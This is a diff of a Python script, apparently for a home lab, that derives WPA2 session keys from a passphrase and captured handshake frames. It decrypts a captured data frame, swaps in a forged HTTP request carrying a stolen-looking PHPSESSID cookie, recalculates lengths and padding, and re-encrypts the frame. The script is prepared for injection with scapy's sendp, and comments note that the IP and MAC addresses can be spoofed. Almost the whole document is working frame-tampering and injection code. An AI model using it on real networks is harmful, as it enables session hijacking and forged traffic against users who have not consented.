@@ -4,7 +4,7 @@ import hmac
 from typing import Tuple
 from Crypto.Cipher import AES # pip install cryptography pycryptodome
 from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
-from scapy.all import RadioTap, Dot11QoS, Dot11CCMP, LLC, hexstr, EAPOL, Raw, IP, sendp
+from scapy.all import RadioTap, Dot11QoS, Dot11CCMP, LLC, hexstr, EAPOL, IP, sendp, Raw, Padding
 
 
 def prf_80211i(K: bytes, A: bytes, B: bytes, Len: int):
@@ -78,20 +78,27 @@ def parse_ccmp_packet(packet) -> Tuple[bytes, bytes]:
     encrypted_data = ccmp_data.data
     return ccmp_iv, encrypted_data
 
-def wpa2_decrypt(tk: bytes, priority: bytes, station_mac: bytes, ccmp_iv: bytes, encrypted_data: bytes):
+def wpa2_decrypt(tk: bytes, priority: bytes, sender_mac: bytes, ccmp_iv: bytes, encrypted_data: bytes):
     ccmp_key = tk
-    nonce = priority + station_mac + ccmp_iv
+    nonce = priority + sender_mac + ccmp_iv
     cipher = AES.new(ccmp_key, AES.MODE_CCM, nonce, mac_len=8)
     plain_data = cipher.decrypt(encrypted_data)
     return plain_data
 
-def wpa2_encrypt(tk: bytes, priority: bytes, station_mac: bytes, ccmp_iv: bytes, plain_data: bytes):
+def wpa2_encrypt(tk: bytes, priority: bytes, sender_mac: bytes, ccmp_iv: bytes, plain_data: bytes):
     ccmp_key = tk
-    nonce = priority + station_mac + ccmp_iv
+    nonce = priority + sender_mac + ccmp_iv
     cipher = AES.new(ccmp_key, AES.MODE_CCM, nonce, mac_len=8)
     encrypted_data = cipher.encrypt(plain_data)
     return encrypted_data
 
+def calc_padding(plain_data: bytes):
+    block_size = 16
+    padding_len = block_size - ((len(plain_data)-10) % block_size)
+    if padding_len == 0:
+        return b''
+    padding = bytes([0] * padding_len)
+    return padding
 
 def main():
     ssid = "test_wifi_5G"
@@ -101,6 +108,8 @@ def main():
     ap_mac = b""
     station_mac = b""
     key_wrap_data = b""
+    tk = b""
+    gtk = b""
     pmk = generate_pmk(ssid, passphrase)
 
     packet_list = ["00003a006b081c40354cf9a400000000100071164001cea10100888e40010100711695221f08000000000000080000e90010180304003c0e000088024c00d4548b3c1a4a00dffafdffff00dffafdffff00000000aaaa03000000888e0103007502008a001000000000000000019e4fe9e1b2fb972c0a3c0e1f405355ba05c51284b2ba90b7c6ef3e1e986adf420000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016dd14000fac0400000000000000000000000000000000a17b6f99",
@@ -120,13 +129,16 @@ def main():
             elif eapol_message.get("message_number") == 3:
                 key_wrap_data = bytes.fromhex(eapol_message.get("wpa_key_data"))
 
-    ptk, kck, kek, tk, mic_tx, mic_rx = generate_ptk(pmk, anonce, snonce, ap_mac, station_mac)
-    print("Generated PTK :", bytes.hex(kck), bytes.hex(kek), bytes.hex(tk), bytes.hex(mic_tx), bytes.hex(mic_rx))
+    if anonce and snonce and ap_mac and station_mac:
+        ptk, kck, kek, tk, mic_tx, mic_rx = generate_ptk(pmk, anonce, snonce, ap_mac, station_mac)
+        print("Generated PTK :", bytes.hex(kck), bytes.hex(kek), bytes.hex(tk), bytes.hex(mic_tx), bytes.hex(mic_rx))
+        gtk = extract_gtk(kek, key_wrap_data)
+        print("GTK :", bytes.hex(gtk))
+    else:
+        print("Generate PTK failed")
 
-    gtk = extract_gtk(kek, key_wrap_data)
-    print("GTK :", bytes.hex(gtk))
 
-    packet = bytes.fromhex("00003a006b0830406bb0a1a500000000141271164001d6a10100000086030000080000caff011600820000000100ff01001018030400193900008841300000dffafdffffd4548b3c1a4a00dffafdfffff01210412e01002000000000bde4ac3b3e6065cae88286019291685b000f76c90744de7bd4ad1939364af4a709319734a30cdd74094ff462a8fa96aa07d824326741958183e49db3531d58065b94ffd3ef18b500cf51e367cd59dd5c7a298733eee8e8762554af7ec4e436d62579e4d4050a758103d25f6d3c37744147e18462c18ff4f44d8481cc8f6a8e3cb52e63c9db03f071a8595294e101d27809f6bbff8c5f96067388f800ab3e9ea9127282a8023d70b6f801b285b6b7ac4584efe3ac4ada4173182e93a1d7dee8c28523186a2968af5c66906abc653a230e189704af2819c72e67e7ce0ea602b1030ae261f7bcfff5ac231342e5311476ff49e6f0375c59b113b23d5d7d7110068f9ab236d7a693ba1158b75dfd86c898fa0dc66f7aa34c0047233e183260acd634d72fa22baddd3082f1caa3575e30e218800633c48e938b63bab1d8987d1c4c8e41119c6d5895398f67dba11473c0474597bc303076544a8b7f3d4953b6375a979c744ca2a020e50b83beb9cdfe77b8c479637de16994c4577384f17c61a3331a24b3647ccddad3a2b4ec660025258d2a470de24b75492d3ca1b9e5f4d1eb3d85676aa08201147eca527471a06c11dd16aefc0d40a910edc3a52c7d1225d69fad6818f6be7504328fcba41dc564a55013031f486cba4c7b03c863708e61e8e59aacd0fbee7bd06b1feb1892dcc305e616c46eea7ce63f389ef1c12b82ee4973affd481ced62cf888b574c01039795e29db0880bb8cc6036ff0e826181d29c805201d81f2ab052c031e487351d5cd7b85e8eb1627bfda5ac5644f1e619a63ee1f941146f318f672b4789b176346e15fb5d732d9e11976369ec21efd95aa362978faa3fd1a4fe6d3274cec2d055d07b")
+    packet = bytes.fromhex("00003a006b083040c135e5a500000000140d71164001cba101000000e9030000040000f7ff01000082000000013f02000010180304004bd9000088424000d4548b3c1a4a00dffafdffff00dffafdffff800d0000d700002000000000d18db0fbd1529bf73a529a34c69871dade4fc0cb2b2dda299a734bd95d6db5005aba1527584403ee526ead73474a1a712283cf642fb0697b7eef21ad364ee3752d290c6b8a3f7cbf3114cd8af6dcdb594f3fa64bc8cafc1d2047959661a85f95b4d91471069754746ebd5b63c673329ef7426e513cf3cb42f63d49e74944cd6dcee7459c34ecd77848c312b0f2889c592d2e3cf1e8e2e564d9d2309a18bf92ac98343d4bbc9f1d1a559384216842634fb942352d5429af6be01ba033619ba11065c4c86313e878d245dce03bd083d8fa324eee02c53f4c1c54008b15b01678cddfcf58b016c5dfec577ce7f1eefa8200013ab95cadd3faf71b5ea5c765642fedd494941a4da08158803768eafafbf8cdba60f25920d54c1362f495913dce26d81ccae14e4fa0b33bfd2594c67bf5d0e3439266f81c12a0b5a8deb3b2cb5c255dbd6fddbbf57617bf525ccabadb9e6445fdabda41eb4f6d8eea208a7e22d10dc2785c72919bc387304c8d281b5a303bb12bd3d3180d9353396fa485e00854116902c6511bf9d01945c7ed19c1fa82aa38389a73de615c45bf74a3369376eedacb64f8ddf2cf476d58bcd9d0fb5dd714160b204165244f831f639a9711cf55960f785b8f495323bb5c3a767f5ab624849c9a513e46d78293827ef1fb67f8c7f14337e889b8e07b2b2ba094c560e0abf725a0aa17f0840a55eca45d03346e748ccd6a14498ea8b7179ae142ddf8ef6d263bd5eb26d03dc30b250f0abfe28f7c8ef7c9f4ca0b2b8a4ce7bc0bf63a59b8b80d60c29bb0d8654e982939cfb4e2013adff593c2c211aa78aab5740143d96da0824e825ef510d871e60d281d6532ac9c8faff106374df5acce98992f4253ba15c405e3efa1dec95e42244b74b5bf05c7fcc87038e3afd10f1415869c9cdde6bbe2223499800b207e6520d3ea7a22be0aee144263ebd100452a0b18ff51542c648a17c78ed50abe836c920a1b067794d054b2ee3c30b42677c53863c4cc21394d7478a0205ba8a319a9ee181c3f3db5407ce245b2070a4c1644a3b25f666a477b824146539736f7dac462659b80dcca096ffd42dae90a824bd393f9269159f760ee48076195bfd40f77a3a5bdecd47f4988fd6909452215adf9968dad1893039441a85474b0b5d2c040abe6607554918ad8e2140f946ded9767a41caca22c615fe7198056d719e9673d3512c7fbb26438a5dfa8ae0aed86cc99ee6094b19c6d8dff1bd6daa1e73da0b39971342f4312be44a1716bc1edac7f8d3d6e3445c73f617d0e77df748d2919e23e5f65250d76ef7e37dd0696c2a9df0bd50256556a3c1415b795f6d5412860a2e9e3ef6a3dcfde793f172e50a6f9c49c427ca0281b61df2c97f7cbe9cace486e367f763ef18e0ce9a2d351358a326a8289d14cb1d71cef2c94730265f16cd751a8a2d5d6aa60ff40113d3c178342f25827df200cfc42735ab0224c82b59eba57d6aed5fe54a9451cc58ef0b6f00ccf89b342008e98a5e712912ac986b97542d5195283195c547ef576f6b531b59094397779de85d74ff6c7c8d56477c44ae39bb52bb660ce3e5cfc8c1a6192537102d685c914107ef219123a6c0620a721486feee2ad8d00cee050161cd314eba98ec3a3912484c382dd462c6868e55ce9554305dce361ab5ae2ffda4f52ba47abb22ec403b4106587351249c84ce31ac5abcbcfe626f8e0f9cb524aa5bb32f38db9b0070f5777fce0da8476fcd4c2e061fefa1006fa390689e71db081288f16d591c661940813bd8dcd584a440d21c9a34424fcd2eaeee040becd5bc9453748cabacf30164b49584ac19323532ce978d212409176d8585c8aba837bae9296d9f0e1edbf57fb46f4de6b2e90900110e81d8043d180d0a10b18c04e9f76910f72391474453a459a93f2f93c038e94b815195ed65ff44e83dbe531caadf214809dca2e1893255cf9d9f6bb9df5e6c4dc295af7672f309f6ccea73dc0347c083387b06d9c56c4ca7e34c785534ec4af4fbe46d29a822a361873e2127d1a15829bb1e4b9285a6e3c0fdacd9d18e23a52aa8c9df7f24dcdc06735561d9952622877e4f27952a77154384046efdca3d60710fecef2ee37b5be053d0aacca9dc3148acc40f3e99b71ad34357f81d4")
     radioTap = RadioTap(packet)
 
     if Dot11QoS in radioTap:
@@ -137,12 +149,16 @@ def main():
     if Dot11CCMP in radioTap:
         ccmp_iv, encrypted_data = parse_ccmp_packet(radioTap)
 
-    plain_data = wpa2_decrypt(tk, priority, station_mac, ccmp_iv, encrypted_data)
+    sender_mac = bytes.fromhex(radioTap.addr2.replace(":",""))
+    if tk and priority and sender_mac and ccmp_iv and encrypted_data:
+        plain_data = wpa2_decrypt(tk, priority, sender_mac, ccmp_iv, encrypted_data)
+    else:
+        print("decrypt failed")
+        return
     LLC_frame = LLC(plain_data)
-    application_layer = LLC_frame[Raw].load
-    # print(application_layer.decode())
+    LLC_frame.show()
 
-    tampered_planintext = """GET /login.php HTTP/1.1
+    tampered_request = """GET /login.php HTTP/1.1
 Host: cobla.io
 Connection: keep-alive
 Cache-Control: max-age=0
@@ -152,15 +168,28 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Referer: http://cobla.io/article.php?no=3199
 Accept-Encoding: gzip, deflate
 Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: PHPSESSID=a8pa4vfohiclm8tbc6mc4lidui"""
+Cookie: PHPSESSID=a8pa4vfohiclm8tbc6mc4lidui
 
-    LLC_frame.load = tampered_planintext.encode()
+"""
+
+    tampered_request = tampered_request.replace("\n","\r\n")
+    LLC_frame[Raw].load = tampered_request.encode()
     # LLC_frame[IP].src = "192.168.0.4" // 변조 가능
     # LLC_frame[IP].dst = "43.201.25.161" // 변조 가능
+    if Padding in LLC_frame:
+        del LLC_frame[Padding]
+        LLC_frame[IP].len = len(bytes((LLC_frame[2])))
+        padding = calc_padding(bytes(LLC_frame))
+        LLC_frame = LLC_frame / Padding(padding)
+    else:
+        LLC_frame[IP].len = len(bytes((LLC_frame[2])))
     tampered_llc = wpa2_encrypt(tk, priority, station_mac, ccmp_iv, bytes(LLC_frame))
+    # LLC_frame.show()
+
     radioTap[Dot11CCMP].data = tampered_llc
-    # radioTap.addr2 = "d4:54:8b:3c:1a:4a" // 변조 가능 wifi adapter mac 98:48:27:88:1e:9d
-    # sendp(radioTap, iface="wlan0") // 2계층 패킷 전송
+    # radioTap.addr2 = "98:48:27:88:1e:9d" // wifi adapter mac
+    # radioTap.show()
+    # sendp(radioTap, iface="wlan0") // 2 계층 패킷 전송
 
 if __name__ == '__main__':
     main()
